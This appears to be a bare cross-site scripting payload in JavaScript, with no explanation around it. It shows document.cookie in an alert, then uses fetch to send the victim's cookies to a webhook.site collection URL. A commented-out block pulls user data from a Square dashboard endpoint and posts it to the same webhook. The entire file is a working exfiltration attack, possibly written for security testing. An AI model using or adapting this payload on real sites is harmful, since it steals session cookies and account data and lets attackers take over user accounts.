alert(document.cookie);

fetch('https://webhook.site/e5828a61-a49c-4ded-a264-d00b69857bcd?data='+encodeURIComponent(document.cookie))


// fetch('https://app.squareup.com/dashboard/current-user-data')
//   .then(r => r.text()) // or r.json() if you're sure it's JSON
//   .then(data => {
//     fetch('https://webhook.site/e5828a61-a49c-4ded-a264-d00b69857bcd', {
//       method: 'POST',
//       headers: {'Content-Type': 'application/x-www-form-urlencoded'},
//       body: 'data=' + encodeURIComponent(data)
//     });
//   })
//   .catch(err => console.error('Error fetching user data:', err));


